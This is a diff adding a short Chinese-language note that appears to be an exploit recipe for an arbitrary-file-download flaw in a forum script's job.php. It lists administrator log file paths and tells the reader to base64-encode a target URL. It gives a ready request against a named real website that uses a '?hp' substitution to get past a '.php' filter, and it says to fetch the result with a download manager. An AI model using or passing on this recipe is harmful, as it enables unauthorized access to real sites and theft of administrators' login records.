@@ -1,0 +1,13 @@
+/cache/adminlogin_logs.php
+/cache/admin_logs.php
+
+先把完整的地址拿到http://md5.mmkey.com/base64/进行加密
+
+例如：http://www.5uds.cn/cache/adminlogin_logs.php
+
+然后：
+http://www.jinrigupiao.com/job.php?job=download&url=aHR0cDovL3d3dy5qaW5yaWd1cGlhby5jb20vY2FjaGUvYWRtaW5sb2dpbl9sb2dzLj9ocA==
+
+拿到迅雷下载就行
+
+突破 ?hp  _hp
